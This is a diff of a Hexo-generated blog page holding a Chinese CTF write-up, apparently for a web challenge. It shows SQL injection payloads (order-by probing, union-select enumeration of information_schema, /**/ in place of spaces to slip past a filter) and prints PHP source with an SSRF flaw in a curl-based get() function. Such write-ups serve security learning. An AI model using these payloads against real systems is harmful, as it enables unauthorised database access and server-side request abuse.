@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      718 字
+      724 字
     </span>
   
 
@@ -255,13 +255,13 @@
 <p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
 <p>接下来继续注入的常规操作。</p>
 <p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
-<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" srcset="/img/loading.gif"></p>
 <p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
 <p><strong>爆表名</strong></p>
 <p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
-<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
-<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
-<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" srcset="/img/loading.gif" alt></p>
+<p>试了试双写绕过，发现继续提示hack，再试试用&#x2F;**&#x2F;替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
+<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
+<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" srcset="/img/loading.gif"></p>
 <p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
 <p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
 <p>爆出一大堆列名。直接读取data的内容</p>
@@ -271,7 +271,7 @@
 <p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
 <p>到这里就不知道怎么办了。。。</p>
 <h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
-<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" srcset="/img/loading.gif"></p>
 <p>源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
@@ -281,36 +281,36 @@
     <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
 <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
-    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
-    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
+    <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
+    <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
+    <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
 &#125;
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$ch</span> = curl_init();
+    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
 
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
-    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
-    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
+    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
         <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
     &#125;
-    curl_close(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
 
     <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
 &#125;
 
 <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
+    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);
 &#125;
 
 <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
 <span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
-    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
+    <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
 &#125;
 &#125;</code></pre></div>
 <p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
